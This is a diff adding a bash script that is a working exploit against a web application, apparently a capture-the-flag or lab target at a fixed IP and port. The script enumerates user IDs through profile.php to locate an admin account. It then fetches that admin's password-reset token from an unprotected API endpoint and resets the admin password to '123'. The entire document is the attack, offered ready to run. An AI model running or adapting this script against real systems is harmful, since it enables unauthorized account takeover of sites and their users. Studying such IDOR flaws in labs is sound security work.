@@ -1,0 +1,53 @@
+#!/bin/bash
+
+# Target base URL (adjust as needed)
+TARGET="http://94.237.51.163:31090"
+
+# Part 1: Scan user IDs from 1 to 100 to find admin
+echo "Scanning users 1-100 for admin..."
+ADMIN_UID=""
+
+for id in {1..100}; do
+  username=$(curl -s "$TARGET/profile.php?uid=$id" | grep -oP "username: \K.*")
+  
+  if [[ -n "$username" ]]; then
+    echo "Found UID $id: $username"
+    
+    # Check if this is admin (case insensitive match)
+    if [[ "$username" =~ [aA][dD][mM][iI][nN] ]]; then
+      ADMIN_UID=$id
+      echo ">>> ADMIN FOUND: UID $ADMIN_UID <<<"
+      break
+    fi
+  fi
+done
+
+if [[ -z "$ADMIN_UID" ]]; then
+  echo "Admin not found in UIDs 1-100"
+  exit 1
+fi
+
+# Part 2: Get token for admin
+echo -e "\nGetting token for admin (UID $ADMIN_UID)..."
+ADMIN_TOKEN=$(curl -s "$TARGET/api.php/token/$ADMIN_UID" | jq -r '.token')
+
+if [[ -z "$ADMIN_TOKEN" ]]; then
+  echo "Failed to get admin token"
+  exit 1
+fi
+
+echo "Admin Token: $ADMIN_TOKEN"
+
+# Part 3: Reset admin password
+echo -e "\nResetting admin password to '123'..."
+reset_response=$(curl -s -v "$TARGET/reset.php?uid=$ADMIN_UID&token=$ADMIN_TOKEN&password=123" 2>&1)
+
+if echo "$reset_response" | grep -q "Password reset successful"; then
+  echo ">>> PASSWORD RESET SUCCESSFUL <<<"
+  echo "Admin UID: $ADMIN_UID"
+  echo "New password: 123"
+else
+  echo "Password reset failed"
+  echo "Response:"
+  echo "$reset_response"
+fi
